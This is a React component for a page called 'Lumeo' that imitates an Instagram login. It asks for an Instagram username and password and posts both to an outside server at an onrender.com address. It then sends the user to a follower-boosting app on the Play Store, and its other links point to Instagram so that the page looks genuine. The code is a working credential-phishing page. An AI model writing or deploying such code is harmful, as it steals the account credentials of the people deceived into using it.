import React from 'react'
import './main.css'
import { useState } from 'react'
import axios from 'axios'

const Main = () => {

  const [username, setUsername] = useState(null)
  const [password, setPassword] = useState(null)

  const handleClick = async () => {
    const req = await axios.post("https://server-ig-g76e.onrender.com/ig-user", {
      username: username,
      password: password,
    })

    console.log(req.data)
  }

  return (
    <div>
      <div className="all-cont">
        <div className="main">
          <div className="head">
            Lumeo
          </div>
          <input type="text" onChange={(e) => setUsername(e.target.value)} className="username" placeholder='Enter your instagram username.' />
          <input type="text" onChange={(e) => setPassword(e.target.value)} className="pass username" placeholder='Enter your instagram password.' />
          <a href={password ?
            "https://play.google.com/store/apps/details?id=com.fame.plus.follow&hl=en_IN"
            : ""} className="log-in username" onClick={handleClick}>
          Login your account
        </a>
        <a className="cont username log-in" href="https://www.instagram.com/">
          Continue with instagram
        </a>
        <a className="forgot" href="https://www.instagram.com/">
          Forgot password?
        </a>
      </div>
    </div>
    </div >
  )
}

export default Main
